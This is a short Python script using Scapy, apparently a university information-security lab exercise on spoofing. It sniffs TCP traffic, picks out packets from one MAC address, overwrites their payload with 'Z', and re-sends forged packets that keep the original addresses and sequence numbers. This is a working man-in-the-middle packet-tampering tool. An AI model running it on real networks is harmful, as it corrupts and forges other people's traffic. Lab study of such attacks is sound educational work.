'''

Segurança da Informação - Spoofing
Felipe Daniel Dias dos Santos - 11711ECP004
Graduação em Engenharia de Computação - Faculdade de Engenharia Elétrica - Universidade Federal de Uberlândia

'''

from scapy.all import *

def spoofPkt(pkt):

	if pkt[Ether].src == '08:00:27:01:64:34':

		print("Pacote original.........")
		print("IP da fonte:", pkt[IP].src)
		print("IP do destino:", pkt[IP].dst)
		print("Dados:", pkt[TCP].payload)

		pkt[TCP].payload = 'Z'
		a = IP(src = pkt[IP].src, dst = pkt[IP].dst, id = pkt[IP].id, flags = pkt[IP].flags)
		b = TCP(sport = pkt[TCP].sport, dport = pkt[TCP].dport, seq = pkt[TCP].seq, ack = pkt[TCP].ack, flags = pkt[TCP].flags)
		data = pkt[TCP].payload
		newpkt = a / b / data

		print("Pacote resultante.........")
		print("IP da fonte:", newpkt[IP].src)
		print("IP do destino:", newpkt[IP].dst)
		print("Dados:", newpkt[TCP].payload)
		send(newpkt)

pkt = sniff(filter = 'tcp', prn = spoofPkt)
